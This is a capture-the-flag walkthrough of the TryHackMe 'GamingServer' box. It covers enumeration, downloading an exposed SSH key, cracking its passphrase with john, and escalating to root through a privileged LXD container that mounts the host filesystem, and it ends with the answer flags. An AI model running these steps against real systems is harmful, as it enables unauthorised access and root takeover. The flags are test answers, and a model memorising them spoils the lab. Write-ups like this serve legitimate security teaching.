# GamingServer

An Easy Boot2Root box for beginners

[GamingServer](https://tryhackme.com/room/gamingserver)

## Topic's

- Network Enumeration
- Web Enumeration
- Web Poking
- Security Misconfiguration
- Brute Forcing Hash
- Exploitation LXC

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Boot2Root

Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system.

```
kali@kali:~/CTFs/tryhackme/GamingServer$ sudo nmap -A -Pn -sS -sC -sV -O 10.10.71.89
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 10:43 CEST
Nmap scan report for 10.10.71.89
Host is up (0.065s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/14%OT=22%CT=1%CU=38364%PV=Y%DS=2%DC=T%G=Y%TM=5F86BA
OS:4D%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SE
OS:Q(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%TS=C)OPS(O1=M508ST11NW7%O2=M508ST11NW7%
OS:O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2
OS:=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   36.03 ms 10.8.0.1
2   36.27 ms 10.10.71.89

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.23 seconds
```

[http://10.10.71.89/robots.txt](http://10.10.71.89/robots.txt)

```
user-agent: *
Allow: /
/uploads/
```

[http://10.10.71.89/uploads/](http://10.10.71.89/uploads/)

```
[ ]	dict.lst	2020-02-05 14:10 	2.0K
[TXT]	manifesto.txt	2020-02-05 13:05 	3.0K
[IMG]	meme.jpg	2020-02-05 13:32 	15K
```

```
kali@kali:~/CTFs/tryhackme/GamingServer$ curl -s http://10.10.71.89 | grep "<\!--"
<!-- Website template by freewebsitetemplates.com -->
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

```
kali@kali:~/CTFs/tryhackme/GamingServer$ gobuster dir -u 10.10.71.89 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.71.89
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/14 10:44:07 Starting gobuster
===============================================================
/uploads (Status: 301)
/secret (Status: 301)
Progress: 48381 / 220561 (21.94%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/14 10:47:40 Finished
===============================================================
```

```
kali@kali:~/CTFs/tryhackme/GamingServer$ gobuster dir -u 10.10.71.89 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.71.89
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/14 10:48:35 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/robots.txt (Status: 200)
/secret (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
===============================================================
2020/10/14 10:48:53 Finished
===============================================================
```

```
kali@kali:~/CTFs/tryhackme/GamingServer$ wget http://10.10.71.89/secret/secretKey
--2020-10-14 10:49:33--  http://10.10.71.89/secret/secretKey
Connecting to 10.10.71.89:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1766 (1.7K)
Saving to: ‘secretKey’

secretKey               100%[===============================>]   1.72K  --.-KB/s    in 0s

2020-10-14 10:49:33 (261 MB/s) - ‘secretKey’ saved [1766/1766]
kali@kali:~/CTFs/tryhackme/GamingServer$ chmod 400 secretKey
kali@kali:~/CTFs/tryhackme/GamingServer$ ssh -i secretKey john@^C
kali@kali:~/CTFs/tryhackme/GamingServer$ /usr/share/john/ssh2john.py secretKey > ssh.hash
kali@kali:~/CTFs/tryhackme/GamingServer$ john ssh.hash  --wordlist=dict.lst
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (secretKey)
1g 0:00:00:00 DONE (2020-10-14 10:50) 33.33g/s 7400p/s 7400c/s 7400C/s baseball..starwars
Session completed
```

`letmein`

```
kali@kali:~/CTFs/tryhackme/GamingServer$ ssh -i secretKey john@10.10.71.89
The authenticity of host '10.10.71.89 (10.10.71.89)' can't be established.
ECDSA key fingerprint is SHA256:LO5bYqjXqLnB39jxUzFMiOaZ1YnyFGGXUmf1edL6R9o.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.71.89' (ECDSA) to the list of known hosts.
Enter passphrase for key 'secretKey':
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Oct 14 08:51:43 UTC 2020

  System load:  0.09              Processes:           98
  Usage of /:   41.1% of 9.78GB   Users logged in:     0
  Memory usage: 17%               IP address for eth0: 10.10.71.89
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$ ls
user.txt
john@exploitable:~$ cat user.txt
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

```
john@exploitable:~$ wget http://10.8.106.222/lxd-alpine-builder/alpine-v3.12-x86_64-20201014_1053.tar.gz
--2020-10-14 08:56:48--  http://10.8.106.222/lxd-alpine-builder/alpine-v3.12-x86_64-20201014_1053.tar.gz
Connecting to 10.8.106.222:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3183829 (3.0M) [application/gzip]
Saving to: ‘alpine-v3.12-x86_64-20201014_1053.tar.gz’

alpine-v3.12-x86_64-2 100%[========================>]   3.04M  1.04MB/s    in 2.9s

2020-10-14 08:56:51 (1.04 MB/s) - ‘alpine-v3.12-x86_64-20201014_1053.tar.gz’ saved [3183829/3183829]

john@exploitable:~$ lxc image list
+-------+-------------+--------+-------------+------+------+-------------+
| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
+-------+-------------+--------+-------------+------+------+-------------+
john@exploitable:~$ lxc image import ./alpine-v3.12-x86_64-20201014_1053.tar.gz --alias myimage
Image imported with fingerprint: 8f83febe3dd6858c008db1d6ef7327876b93df2f5846489921dcc6
john@exploitable:~$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | 8f83febe3dd6 | no     | alpine v3.12 (20201014_10:53) | x86_64 | 3.04MB | Oct 14, 2020 at 8:58am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
john@exploitable:~$ lxc init myimage ignite -c security.privileged=true
Creating ignite
john@exploitable:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
john@exploitable:~$ lxc start ignite
john@exploitable:~$ lxc exec ignite /bin/bash
john@exploitable:~$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # find / -type f -name root.txt 2>/dev/null
/mnt/root/root/root.txt
~ # cat /mnt/root/root/root.txt
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```

1. What is the user flag?

`a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e`

2. What is the root flag?

`2e337b8c9f3aff0c2b3e8d4e6a7c88fc`
